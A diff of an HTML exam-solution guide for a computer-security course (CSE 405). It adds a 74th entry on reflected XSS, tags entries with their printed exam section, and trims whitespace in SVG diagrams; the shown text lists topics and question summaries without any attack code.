@@ -1,12 +1,12 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSE 405 — 73 Worked Solutions</title><style>
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSE 405 — 74 Worked Solutions</title><style>
 :root{--ink:#1c3047;--blue:#28557e;--muted:#5a6b7c;--line:#dce4eb}*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:#edf2f6;color:var(--ink);font:16px/1.65 system-ui,sans-serif}nav{position:fixed;inset:0 auto 0 0;width:280px;background:#172c44;color:#fff;padding:24px 18px;overflow:auto}nav h2{font-size:18px;color:white}nav a{color:#d8e8f5;text-decoration:none;display:block;font-size:12px;line-height:1.45;padding:5px 0}nav input{width:100%;padding:10px;border:0;border-radius:5px;margin:8px 0 16px}nav button{border:1px solid #9eb6c8;color:white;background:transparent;padding:7px 10px;border-radius:4px;cursor:pointer}main{max-width:1100px;margin:0 auto 0 300px;padding:42px 48px;background:white;min-height:100vh}h1{font-size:36px;line-height:1.2;letter-spacing:-.8px}h2{margin-top:55px;border-bottom:2px solid var(--line);padding-bottom:10px;color:var(--blue)}h3{margin-top:32px;font-size:23px;line-height:1.35}a{color:#225c8d}p,li{overflow-wrap:anywhere}blockquote{margin:20px 0;padding:14px 18px;border-left:4px solid #87a8c5;background:#f2f6f9;font-size:14px;color:#465b6b}pre{font:13px/1.55 'DejaVu Sans Mono',monospace;background:#f3f6f8;border:1px solid var(--line);padding:15px;border-radius:5px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere}code{font: .88em 'DejaVu Sans Mono',monospace}table{border-collapse:collapse;width:100%;margin:20px 0;font-size:13px}th,td{text-align:left;vertical-align:top;padding:9px;border:1px solid var(--line)}th{background:#eaf1f7}tbody tr:nth-child(even){background:#f9fbfc}.math-display{overflow-x:auto;margin:1.2em 0;padding:.3em 0}.math-inline{white-space:nowrap}svg.diagram,img{display:block;max-width:100%;height:auto;margin:24px auto}section.question{padding-bottom:25px;border-bottom:1px solid var(--line)}.question p:has(>strong:first-child){scroll-margin-top:20px}.hidden{display:none!important}.hint{font-size:12px;color:#adc5d8}footer{margin-top:40px;font-size:12px;color:var(--muted)}@media(max-width:900px){nav{position:static;width:auto;max-height:350px}main{margin:0;padding:24px}h1{font-size:29px}}@media print{@page{size:A4;margin:18mm}nav{display:none}main{margin:0;max-width:none;padding:0}body{background:white;font-size:10.5pt}h2{break-before:page}h3{break-after:avoid}pre,table,svg{break-inside:avoid}a{color:inherit}section.question{border:0}.hidden{display:block!important}}
-</style></head><body><nav><h2>CSE 405 · Solutions</h2><p class="hint">73 answers · LaTeX math</p><input id="search" aria-label="Search solutions" placeholder="Search answers or topics…"><button onclick="window.print()">Print / save PDF</button><a href="#s01">S01 · 2023–24 Q5(a)<br>Short concepts; answer any three of five</a><a href="#s02">S02 · 2023–24 Q5(b)<br>Unfamiliar chaining diagram; equations, parallelism and malleability</a><a href="#s03">S03 · 2023–24 Q6(a)<br>Unauthenticated Diffie–Hellman MITM; defense without a trusted third party</a><a href="#s04">S04 · 2023–24 Q6(b)<br>Recover affine-cipher keys from two mappings</a><a href="#s05">S05 · 2023–24 Q7(a)<br>Numerical ElGamal; IND-CPA and non-malleability</a><a href="#s06">S06 · 2023–24 Q7(b)<br>RSA correctness proof</a><a href="#s07">S07 · 2023–24 Q7(c)<br>RSA signing/verifying; security of separately sending ciphertext and signature</a><a href="#s08">S08 · 2023–24 Q8(a)<br>Encrypt-then-MAC versus MAC-then-encrypt</a><a href="#s09">S09 · 2023–24 Q8(b)<br>Cookie-send matrix</a><a href="#s10">S10 · 2023–24 Q8(c)<br>Login bypass; prepared statements</a><a href="#s11">S11 · 2023–24 Q8(d)<br>Stored versus reflected XSS</a><a href="#s12">S12 · 2023–24 Q1(c)<br>Untrusted key bundled with its own signature; attacker positions</a><a href="#s13">S13 · 2023–24 Q4(c)<br>TLS handshake authentication, directional keys and authenticated records</a><a href="#s14">S14 · 2022–23 Q5(a)<br>ECB/CBC/CTR comparison</a><a href="#s15">S15 · 2022–23 Q5(b)<br>Analyze encryption plus hash, plaintext MAC, or ciphertext MAC</a><a href="#s16">S16 · 2022–23 Q5(c)<br>Limits of cookie policy</a><a href="#s17">S17 · 2022–23 Q6(a)<br>Authenticate Diffie–Hellman with RSA signatures</a><a href="#s18">S18 · 2022–23 Q6(b)<br>INSERT-query injection; bypass a cart quantity restriction</a><a href="#s19">S19 · 2022–23 Q6(c)<br>HMAC-DRBG generation, security and rollback resistance</a><a href="#s20">S20 · 2022–23 Q7(a)<br>CSRF synchronizer token; refreshing only on POST</a><a href="#s21">S21 · 2022–23 Q7(c)<br>Stored versus reflected XSS</a><a href="#s22">S22 · 2022–23 Q8(a)<br>Integrity tags in a file header; hash versus MAC; writable versus read-only storage</a><a href="#s23">S23 · 2022–23 Q8(b)<br>SMS 2FA against phishing</a><a href="#s24">S24 · 2022–23 Q8(c)<br>Clickjacking with iframes; repeated-click redirection</a><a href="#s25">S25 · 2022–23 Q2(a)<br>Brute-force throughput under a password-expiration policy</a><a href="#s26">S26 · 2021–22 Q1(c)<br>Hill encryption and decryption with a 3×3 key</a><a href="#s27">S27 · 2021–22 Q1(d)<br>Caesar as symmetric encryption; composition of affine ciphers</a><a href="#s28">S28 · 2021–22 Q2(a)<br>Attacks versus information-security CIA goals</a><a href="#s29">S29 · 2021–22 Q2(b)<br>Compute an elliptic-curve point group</a><a href="#s30">S30 · 2021–22 Q2(c)<br>Numerical Diffie–Hellman exchange</a><a href="#s31">S31 · 2021–22 Q2(d)<br>Identify ECB-style long-message weakness and replace the mode</a><a href="#s32">S32 · 2021–22 Q3(b)<br>Applications of hashing in authentication, confidentiality and signatures</a><a href="#s33">S33 · 2021–22 Q3(c)<br>Evaluate XOR of fixed-size message blocks as a hash</a><a href="#s34">S34 · 2021–22 Q3(d)<br>Symmetric/public-key comparison; key roles in signing versus encryption</a><a href="#s35">S35 · 2021–22 Q4(b)<br>HMAC construction</a><a href="#s36">S36 · 2021–22 Q4(c)<br>DES attack; meet-in-the-middle strength of fivefold DES</a><a href="#s37">S37 · 2021–22 Q4(d)<br>Compare DES components with AES</a><a href="#s38">S38 · 2021–22 Q7(b)<br>Clickjacking versus phishing</a><a href="#s39">S39 · 2021–22 Q7(c)<br>Self-signed SSL certificate and server authentication</a><a href="#s40">S40 · 2020–21 Q5(a)<br>Authenticate UDP messages with a cookie/token; prevent replay</a><a href="#s41">S41 · 2020–21 Q5(b)<br>Single-statement SQL injection in a password-change form</a><a href="#s42">S42 · 2020–21 Q6(a)<br>CSRF plus stored XSS in a social-network friend request</a><a href="#s43">S43 · 2020–21 Q6(b)<br>ElGamal signature algorithm and reuse of secret k</a><a href="#s44">S44 · 2020–21 Q7(a)<br>Break a Caesar-then-Hill construction</a><a href="#s45">S45 · 2020–21 Q7(b)<br>Cookie-send matrix</a><a href="#s46">S46 · 2020–21 Q8(b)<br>Birthday bound for a b-bit hash</a><a href="#s47">S47 · 2020–21 Q8(c)<br>Invalidate session cookies after password change</a><a href="#s48">S48 · 2019–20 Q1(a)<br>Digital signatures and non-repudiation</a><a href="#s49">S49 · 2019–20 Q1(c)<br>Public security questions and password-reset account takeover</a><a href="#s50">S50 · 2019–20 Q2(b)<br>Password-space size and average brute-force time</a><a href="#s51">S51 · 2019–20 Q6(a)<br>OTP encryption/decryption; transposition as a Hill cipher</a><a href="#s52">S52 · 2019–20 Q6(b)<br>Weak/strong collision resistance; toy hash; Merkle–Damgård</a><a href="#s53">S53 · 2019–20 Q7(a)<br>Euler totient/theorem; modular inverse</a><a href="#s54">S54 · 2019–20 Q7(b)<br>Modular equations and fast exponentiation</a><a href="#s55">S55 · 2019–20 Q7(c)<br>RSA validity, repeated totients and encryption</a><a href="#s56">S56 · 2019–20 Q8(a)<br>ElGamal encryption proof; birthday attack on signatures</a><a href="#s57">S57 · 2019–20 Q8(b)<br>Diffie–Hellman steps and active MITM</a><a href="#s58">S58 · 2018–19 Q1(a)<br>Digital-certificate contents and CA role</a><a href="#s59">S59 · 2018–19 Q1(d)<br>Risks of signing an apparently random string</a><a href="#s60">S60 · 2018–19 Q4(b)<br>Pharming versus phishing</a><a href="#s61">S61 · 2018–19 Q5(a)<br>Hill-cipher numerical encryption</a><a href="#s62">S62 · 2018–19 Q5(b)<br>Inserted ciphertext bit and CBC synchronization</a><a href="#s63">S63 · 2018–19 Q6(a)<br>Trace P-box and S-box diagrams</a><a href="#s64">S64 · 2018–19 Q8(b)<br>Short notes; answer any three of four</a><a href="#s65">S65 · 2018–19 Q11(a)<br>UPDATE injection to change password and salary</a><a href="#s66">S66 · 2018–19 Q11(b)<br>Rewrite vulnerable PHP using prepared statements</a><a href="#s67">S67 · 2018–19 Q12(a)<br>Stored XSS in a guest book; malicious page actions</a><a href="#s68">S68 · 2023–24 Q1(b)<br>Match five scenarios to security principles</a><a href="#s69">S69 · 2022–23 Q1(a)<br>Least privilege versus separation; why record compromise?</a><a href="#s70">S70 · 2020–21 Q1(b)<br>Selective packet dropping against a competitor</a><a href="#s71">S71 · 2020–21 Q1(c)<br>Why compromise recording matters and which tools support it</a><a href="#s72">S72 · 2020–21 Q2(b)<br>Mismatched boarding-pass and identity checks</a><a href="#s73">S73 · 2020–21 Q8(a)<br>Audit scanf, privileged file opening and a name-based access race</a></nav><main><h1>CSE 405 · Worked Final-Exam Solutions</h1>
+</style></head><body><nav><h2>CSE 405 · Solutions</h2><p class="hint">74 entries · LaTeX math</p><input id="search" aria-label="Search solutions" placeholder="Search answers or topics…"><button onclick="window.print()">Print / save PDF</button><a href="#s01">S01 · 2023–24 Q5(a)<br>Short concepts; answer any three of five</a><a href="#s02">S02 · 2023–24 Q5(b)<br>Unfamiliar chaining diagram; equations, parallelism and malleability</a><a href="#s03">S03 · 2023–24 Q6(a)<br>Unauthenticated Diffie–Hellman MITM; defense without a trusted third party</a><a href="#s04">S04 · 2023–24 Q6(b)<br>Recover affine-cipher keys from two mappings</a><a href="#s05">S05 · 2023–24 Q7(a)<br>Numerical ElGamal; IND-CPA and non-malleability</a><a href="#s06">S06 · 2023–24 Q7(b)<br>RSA correctness proof</a><a href="#s07">S07 · 2023–24 Q7(c)<br>RSA signing/verifying; security of separately sending ciphertext and signature</a><a href="#s08">S08 · 2023–24 Q8(a)<br>Encrypt-then-MAC versus MAC-then-encrypt</a><a href="#s09">S09 · 2023–24 Q8(b)<br>Cookie-send matrix</a><a href="#s10">S10 · 2023–24 Q8(c)<br>Login bypass; prepared statements</a><a href="#s11">S11 · 2023–24 Q8(d)<br>Stored versus reflected XSS</a><a href="#s12">S12 · 2023–24 Q1(c)<br>Untrusted key bundled with its own signature; attacker positions</a><a href="#s13">S13 · 2023–24 Q4(c)<br>TLS handshake authentication, directional keys and authenticated records</a><a href="#s14">S14 · 2022–23 Q5(a)<br>ECB/CBC/CTR comparison</a><a href="#s15">S15 · 2022–23 Q5(b)<br>Analyze encryption plus hash, plaintext MAC, or ciphertext MAC</a><a href="#s16">S16 · 2022–23 Q5(c)<br>Limits of cookie policy</a><a href="#s17">S17 · 2022–23 Q6(a)<br>Authenticate Diffie–Hellman with RSA signatures</a><a href="#s18">S18 · 2022–23 Q6(b)<br>INSERT-query injection; bypass a cart quantity restriction</a><a href="#s19">S19 · 2022–23 Q6(c)<br>HMAC-DRBG generation, security and rollback resistance</a><a href="#s20">S20 · 2022–23 Q7(a)<br>CSRF synchronizer token; refreshing only on POST</a><a href="#s21">S21 · 2022–23 Q7(c)<br>Stored versus reflected XSS</a><a href="#s22">S22 · 2022–23 Q8(a)<br>Integrity tags in a file header; hash versus MAC; writable versus read-only storage</a><a href="#s23">S23 · 2022–23 Q8(b)<br>SMS 2FA against phishing</a><a href="#s24">S24 · 2022–23 Q8(c)<br>Clickjacking with iframes; repeated-click redirection</a><a href="#s25">S25 · 2022–23 Q2(a)<br>Brute-force throughput under a password-expiration policy</a><a href="#s26">S26 · 2021–22 Q1(c)<br>Hill encryption and decryption with a 3×3 key</a><a href="#s27">S27 · 2021–22 Q1(d)<br>Caesar as symmetric encryption; composition of affine ciphers</a><a href="#s28">S28 · 2021–22 Q2(a)<br>Attacks versus information-security CIA goals</a><a href="#s29">S29 · 2021–22 Q2(b)<br>Compute an elliptic-curve point group</a><a href="#s30">S30 · 2021–22 Q2(c)<br>Numerical Diffie–Hellman exchange</a><a href="#s31">S31 · 2021–22 Q2(d)<br>Identify ECB-style long-message weakness and replace the mode</a><a href="#s32">S32 · 2021–22 Q3(b)<br>Applications of hashing in authentication, confidentiality and signatures</a><a href="#s33">S33 · 2021–22 Q3(c)<br>Evaluate XOR of fixed-size message blocks as a hash</a><a href="#s34">S34 · 2021–22 Q3(d)<br>Symmetric/public-key comparison; key roles in signing versus encryption</a><a href="#s35">S35 · 2021–22 Q4(b)<br>HMAC construction</a><a href="#s36">S36 · 2021–22 Q4(c)<br>DES attack; meet-in-the-middle strength of fivefold DES</a><a href="#s37">S37 · 2021–22 Q4(d)<br>Compare DES components with AES</a><a href="#s38">S38 · 2021–22 Q7(b)<br>Clickjacking versus phishing</a><a href="#s39">S39 · 2021–22 Q7(c)<br>Self-signed SSL certificate and server authentication</a><a href="#s40">S40 · 2020–21 Q5(a)<br>Authenticate UDP messages with a cookie/token; prevent replay</a><a href="#s41">S41 · 2020–21 Q5(b)<br>Single-statement SQL injection in a password-change form</a><a href="#s42">S42 · 2020–21 Q6(a)<br>CSRF plus stored XSS in a social-network friend request</a><a href="#s43">S43 · 2020–21 Q6(b)<br>ElGamal signature algorithm and reuse of secret k</a><a href="#s44">S44 · 2020–21 Q7(a)<br>Break a Caesar-then-Hill construction</a><a href="#s45">S45 · 2020–21 Q7(b)<br>Cookie-send matrix</a><a href="#s46">S46 · 2020–21 Q8(b)<br>Birthday bound for a b-bit hash</a><a href="#s47">S47 · 2020–21 Q8(c)<br>Invalidate session cookies after password change</a><a href="#s48">S48 · 2019–20 Q1(a)<br>Digital signatures and non-repudiation</a><a href="#s49">S49 · 2019–20 Q1(c)<br>Public security questions and password-reset account takeover</a><a href="#s50">S50 · 2019–20 Q2(b)<br>Password-space size and average brute-force time</a><a href="#s51">S51 · 2019–20 Q6(a)<br>OTP encryption/decryption; transposition as a Hill cipher</a><a href="#s52">S52 · 2019–20 Q6(b)<br>Weak/strong collision resistance; toy hash; Merkle–Damgård</a><a href="#s53">S53 · 2019–20 Q7(a)<br>Euler totient/theorem; modular inverse</a><a href="#s54">S54 · 2019–20 Q7(b)<br>Modular equations and fast exponentiation</a><a href="#s55">S55 · 2019–20 Q7(c)<br>RSA validity, repeated totients and encryption</a><a href="#s56">S56 · 2019–20 Q8(a)<br>ElGamal encryption proof; birthday attack on signatures</a><a href="#s57">S57 · 2019–20 Q8(b)<br>Diffie–Hellman steps and active MITM</a><a href="#s58">S58 · 2018–19 Q1(a)<br>Digital-certificate contents and CA role</a><a href="#s59">S59 · 2018–19 Q1(d)<br>Risks of signing an apparently random string</a><a href="#s60">S60 · 2018–19 Q4(b)<br>Pharming versus phishing</a><a href="#s61">S61 · 2018–19 Q5(a)<br>Hill-cipher numerical encryption</a><a href="#s62">S62 · 2018–19 Q5(b)<br>Inserted ciphertext bit and CBC synchronization</a><a href="#s63">S63 · 2018–19 Q6(a)<br>Trace P-box and S-box diagrams</a><a href="#s64">S64 · 2018–19 Q8(b)<br>Short notes; answer any three of four</a><a href="#s65">S65 · 2018–19 Q11(a)<br>UPDATE injection to change password and salary</a><a href="#s66">S66 · 2018–19 Q11(b)<br>Rewrite vulnerable PHP using prepared statements</a><a href="#s67">S67 · 2018–19 Q12(a)<br>Stored XSS in a guest book; malicious page actions</a><a href="#s68">S68 · 2023–24 Q1(b)<br>Match five scenarios to security principles</a><a href="#s69">S69 · 2022–23 Q1(a)<br>Least privilege versus separation; why record compromise?</a><a href="#s70">S70 · 2020–21 Q1(b)<br>Selective packet dropping against a competitor</a><a href="#s71">S71 · 2020–21 Q1(c)<br>Why compromise recording matters and which tools support it</a><a href="#s72">S72 · 2020–21 Q2(b)<br>Mismatched boarding-pass and identity checks</a><a href="#s73">S73 · 2020–21 Q8(a)<br>Audit scanf, privileged file opening and a name-based access race</a><a href="#s74">S74 · 2023–24 Q3(a)<br>Limits of HTTPS/firewall/NIDS protection against reflected XSS</a></nav><main><h1>CSE 405 · Worked Final-Exam Solutions</h1>
 <h2>How to use this guide</h2>
-<p><strong>73 complete worked solutions · six academic sessions · all gathered questions.</strong> Each question appears once with its original index label S01–S73. The topic/deck index also points to mixed questions taught partly elsewhere. The HTML has search, question navigation, scalable diagrams and typeset equations; the PDF is compiled from LaTeX for printing. The Markdown is editable.</p>
+<p><strong>74 worked entries · six academic sessions · 73 whole-question entries and one Sec B component of a mixed question.</strong> Each question appears once with its original index label S01–S74. The topic/deck index also points to mixed questions taught partly elsewhere. The HTML has search, question navigation, scalable diagrams and typeset equations; the PDF is compiled from LaTeX for printing. The Markdown is editable.</p>
 <p>Question summaries are paraphrases. The root PDF remains the authority for wording, code and figures. The solution metadata links to its physical page. Each answer includes reasoning and an exam tip; assumptions and defects in printed questions are identified rather than silently repaired. These are independent worked solutions, not an official marking scheme.</p>
 <p><strong>Conventions:</strong> A=0,…,Z=25; Hill uses column vectors; XOR is bitwise addition modulo 2; || means unambiguous concatenation; exponents, matrices and modular arithmetic use LaTeX notation. Unless stated otherwise, tags/signatures cover the relevant identity, nonce and protocol context. Computational results use the numbers in the paper.</p>
 <p><strong>Four corrections to keep in mind:</strong> Cookie 2 in 2020–21 Q7(b) is non-secure; the 2018–19 Hill key is not invertible modulo 26; the full-group ElGamal question needs a valid nonzero-message argument; a visible cookie or freshly transmitted plaintext MAC key cannot authenticate against an eavesdropper. Relevant solutions explain each point.</p>
-<p>Lecture 9 has no separate standalone question in the gathered index. Its URL/HTTP/origin foundations are used in the web solutions. The newly supplied Lecture 1 adds six principle/availability/TOCTOU questions (S68–S73) and gives an explicit source for the existing information-security CIA question. Other Sec A-only material remains in its own guide.</p>
+<p>Lecture 9 has no separate standalone question in the gathered index. Its URL/HTTP/origin foundations are used in the web solutions. The newly supplied Lecture 1 adds six principle/availability/TOCTOU questions (S68–S73) and gives an explicit source for the existing information-security CIA question. Other Sec A-only material remains in its own guide. S74 covers only the reflected-XSS case of 2023–24 Q3(a); the four network cases are in Sec A. Both printed exam sections are checked for current Sec B topics.</p>
 <h2>Navigation by teaching source</h2>
 <p><strong>Lecture 1 — Introduction and Security Principles</strong></p>
 <p><a href="#s28">S28: 2021–22 Q2(a)</a>; <a href="#s68">S68: 2023–24 Q1(b)</a>; <a href="#s69">S69: 2022–23 Q1(a)</a>; <a href="#s70">S70: 2020–21 Q1(b)</a>; <a href="#s71">S71: 2020–21 Q1(c)</a>; <a href="#s72">S72: 2020–21 Q2(b)</a>; <a href="#s73">S73: 2020–21 Q8(a)</a></p>
@@ -27,7 +27,7 @@
 <p><strong>Lecture 10 — Cookies, sessions and CSRF</strong></p>
 <p><a href="#s09">S09: 2023–24 Q8(b)</a>; <a href="#s16">S16: 2022–23 Q5(c)</a>; <a href="#s20">S20: 2022–23 Q7(a)</a>; <a href="#s40">S40: 2020–21 Q5(a)</a>; <a href="#s42">S42: 2020–21 Q6(a)</a>; <a href="#s45">S45: 2020–21 Q7(b)</a>; <a href="#s47">S47: 2020–21 Q8(c)</a></p>
 <p><strong>Lecture 11 — XSS and UI Attacks</strong></p>
-<p><a href="#s01">S01: 2023–24 Q5(a)</a>; <a href="#s11">S11: 2023–24 Q8(d)</a>; <a href="#s16">S16: 2022–23 Q5(c)</a>; <a href="#s21">S21: 2022–23 Q7(c)</a>; <a href="#s23">S23: 2022–23 Q8(b)</a>; <a href="#s24">S24: 2022–23 Q8(c)</a>; <a href="#s38">S38: 2021–22 Q7(b)</a>; <a href="#s42">S42: 2020–21 Q6(a)</a>; <a href="#s60">S60: 2018–19 Q4(b)</a>; <a href="#s64">S64: 2018–19 Q8(b)</a>; <a href="#s67">S67: 2018–19 Q12(a)</a></p>
+<p><a href="#s01">S01: 2023–24 Q5(a)</a>; <a href="#s11">S11: 2023–24 Q8(d)</a>; <a href="#s16">S16: 2022–23 Q5(c)</a>; <a href="#s21">S21: 2022–23 Q7(c)</a>; <a href="#s23">S23: 2022–23 Q8(b)</a>; <a href="#s24">S24: 2022–23 Q8(c)</a>; <a href="#s38">S38: 2021–22 Q7(b)</a>; <a href="#s42">S42: 2020–21 Q6(a)</a>; <a href="#s60">S60: 2018–19 Q4(b)</a>; <a href="#s64">S64: 2018–19 Q8(b)</a>; <a href="#s67">S67: 2018–19 Q12(a)</a>; <a href="#s74">S74: 2023–24 Q3(a)</a></p>
 <p><strong>Lecture 12 — SQL Injection and CAPTCHAs</strong></p>
 <p><a href="#s10">S10: 2023–24 Q8(c)</a>; <a href="#s18">S18: 2022–23 Q6(b)</a>; <a href="#s41">S41: 2020–21 Q5(b)</a>; <a href="#s64">S64: 2018–19 Q8(b)</a>; <a href="#s65">S65: 2018–19 Q11(a)</a>; <a href="#s66">S66: 2018–19 Q11(b)</a></p>
 <h2>Numerical answers at a glance</h2>
@@ -86,7 +86,7 @@
 <p><a id="s28"></a></p>
 <section class="question"><h3>S28 · 2021–22 · Q2(a)</h3>
 <p><strong>Attacks versus information-security CIA goals · 5 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Categorize security attacks with respect to C.I.A. goals.</p>
 </blockquote>
@@ -122,7 +122,7 @@
 <p><a id="s68"></a></p>
 </section><section class="question"><h3>S68 · 2023–24 · Q1(b)</h3>
 <p><strong>Match five scenarios to security principles · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=2">root question PDF, page 2</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=2">root question PDF, page 2</a>. Sitting date: 06 September 2025. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Match principles to a valet key, bypassable laptop screen lock, irreversible water-damage sticker, bank recovery questions overridden by a representative, and encryption at rest and in transit.</p>
 </blockquote>
@@ -161,7 +161,7 @@
 <p><a id="s69"></a></p>
 </section><section class="question"><h3>S69 · 2022–23 · Q1(a)</h3>
 <p><strong>Least privilege versus separation; why record compromise? · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=11">root question PDF, page 11</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=11">root question PDF, page 11</a>. Sitting date: 18 April 2024. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Differentiate least privilege and separation of privilege, and explain the importance of compromise recording with examples.</p>
 </blockquote>
@@ -172,7 +172,7 @@
 <p><a id="s70"></a></p>
 </section><section class="question"><h3>S70 · 2020–21 · Q1(b)</h3>
 <p><strong>Selective packet dropping against a competitor · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> An ISP deliberately drops 25% of a competing provider’s VoIP packets traversing its routers. Identify the attack.</p>
 </blockquote>
@@ -182,7 +182,7 @@
 <p><a id="s71"></a></p>
 </section><section class="question"><h3>S71 · 2020–21 · Q1(c)</h3>
 <p><strong>Why compromise recording matters and which tools support it · 11 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain the importance of compromise recording and name tools used for it.</p>
 </blockquote>
@@ -193,7 +193,7 @@
 <p><a id="s72"></a></p>
 </section><section class="question"><h3>S72 · 2020–21 · Q2(b)</h3>
 <p><strong>Mismatched boarding-pass and identity checks · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=18">root question PDF, page 18</a>. Sitting date: 25 September 2022. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain how online-printable boarding passes permit a no-fly-list bypass in the described airport checks, and fix the weakness.</p>
 </blockquote>
@@ -204,7 +204,7 @@
 <p><a id="s73"></a></p>
 </section><section class="question"><h3>S73 · 2020–21 · Q8(a)</h3>
 <p><strong>Audit scanf, privileged file opening and a name-based access race · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Analyze attacks on the printed C program (code on p. 21): scanf into buffer[60], fopen(fn,"a+"), access(fn,W_OK), fwrite; state environmental assumptions.</p>
 </blockquote>
@@ -219,7 +219,7 @@
 <p><a id="s01"></a></p>
 <section class="question"><h3>S01 · 2023–24 · Q5(a)</h3>
 <p><strong>Short concepts; answer any three of five · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=7">root question PDF, page 7</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=7">root question PDF, page 7</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Briefly explain any three, with diagrams where appropriate: (i) the CIA properties of cryptography, (ii) confusion and diffusion, (iii) message authentication code, (iv) homograph phishing attack, (v) clickjacking.</p>
 </blockquote>
@@ -249,69 +249,69 @@
 </defs>
 <g id="fig-0-figure_1">
 <g id="fig-0-patch_1">
-<path d="M 0 216.864 
-L 575.28 216.864 
-L 575.28 0 
-L 0 0 
+<path d="M 0 216.864
+L 575.28 216.864
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-0-axes_1">
 <g id="fig-0-patch_2">
-<path clip-path="url(#fig-0-pe4623215e2)" d="M 27.612 193.2552 
-L 397.008 193.2552 
-Q 400.914 193.2552 400.914 189.3744 
-L 400.914 46.8936 
-Q 400.914 43.0128 397.008 43.0128 
-L 27.612 43.0128 
-Q 23.706 43.0128 23.706 46.8936 
-L 23.706 189.3744 
-Q 23.706 193.2552 27.612 193.2552 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 27.612 193.2552
+L 397.008 193.2552
+Q 400.914 193.2552 400.914 189.3744
+L 400.914 46.8936
+Q 400.914 43.0128 397.008 43.0128
+L 27.612 43.0128
+Q 23.706 43.0128 23.706 46.8936
+L 23.706 189.3744
+Q 23.706 193.2552 27.612 193.2552
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-0-patch_3">
-<path clip-path="url(#fig-0-pe4623215e2)" d="M 83.412 159.9912 
-L 341.208 159.9912 
-Q 345.114 159.9912 345.114 156.1104 
-L 345.114 102.3336 
-Q 345.114 98.4528 341.208 98.4528 
-L 83.412 98.4528 
-Q 79.506 98.4528 79.506 102.3336 
-L 79.506 156.1104 
-Q 79.506 159.9912 83.412 159.9912 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 83.412 159.9912
+L 341.208 159.9912
+Q 345.114 159.9912 345.114 156.1104
+L 345.114 102.3336
+Q 345.114 98.4528 341.208 98.4528
+L 83.412 98.4528
+Q 79.506 98.4528 79.506 102.3336
+L 79.506 156.1104
+Q 79.506 159.9912 83.412 159.9912
 z
 " style="fill: #267261; fill-opacity: 0.05098; stroke: #267261; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-0-patch_4">
-<path clip-path="url(#fig-0-pe4623215e2)" d="M 72.81 166.644 
-L 351.81 166.644 
-L 351.81 91.8 
-L 72.81 91.8 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 72.81 166.644
+L 351.81 166.644
+L 351.81 91.8
+L 72.81 91.8
 z
 " style="fill: #aa3d46; opacity: 0.12; stroke: #aa3d46; stroke-width: 2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-0-patch_5">
-<path clip-path="url(#fig-0-pe4623215e2)" d="M 181.062 150.012 
-L 246.348 150.012 
-Q 250.254 150.012 250.254 146.1312 
-L 250.254 125.6184 
-Q 250.254 121.7376 246.348 121.7376 
-L 181.062 121.7376 
-Q 177.156 121.7376 177.156 125.6184 
-L 177.156 146.1312 
-Q 177.156 150.012 181.062 150.012 
+<path clip-path="url(#fig-0-pe4623215e2)" d="M 181.062 150.012
+L 246.348 150.012
+Q 250.254 150.012 250.254 146.1312
+L 250.254 125.6184
+Q 250.254 121.7376 246.348 121.7376
+L 181.062 121.7376
+Q 177.156 121.7376 177.156 125.6184
+L 177.156 146.1312
+Q 177.156 150.012 181.062 150.012
 z
 " style="fill: #aa3d46; fill-opacity: 0.05098; stroke: #aa3d46; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-0-patch_6">
